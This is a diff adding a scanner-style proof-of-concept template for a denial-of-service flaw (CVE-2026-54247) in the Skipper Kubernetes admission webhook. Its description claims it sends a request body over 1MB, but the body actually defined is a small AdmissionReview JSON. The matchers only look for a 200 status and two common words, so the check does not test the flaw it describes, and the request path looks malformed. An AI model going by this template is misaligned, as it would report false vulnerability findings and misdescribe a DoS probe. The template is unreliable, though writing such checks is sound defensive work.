@@ -1,0 +1,46 @@
+[info]
+author = "AVE"
+description = "向 Skipper 准入 Webhook 端点发送超过 1MB 的请求体，验证是否因无大小限制而被处理（返回 200），而非被拒绝（413）。与 OPA 过滤器不同，准入处理程序未设置请求体大小限制。"
+id = "POC-AVE-2026-0506"
+name = "Zalando Skipper 准入 Webhook 无限制请求体读取致内存耗尽拒绝服务漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-54247",
+    "denial-of-service",
+    "skipper",
+    "kubernetes",
+    "admission-webhook",
+]
+vuln_id = [
+    "CVE-2026-54247",
+    "AVE-2026-0506",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/admission"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"apiVersion":"admission.k8s.io/v1","kind":"AdmissionReview","request":{"uid":"test","object":{"metadata":{"name":"test"}}}}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid",
+    "allowed",
+]
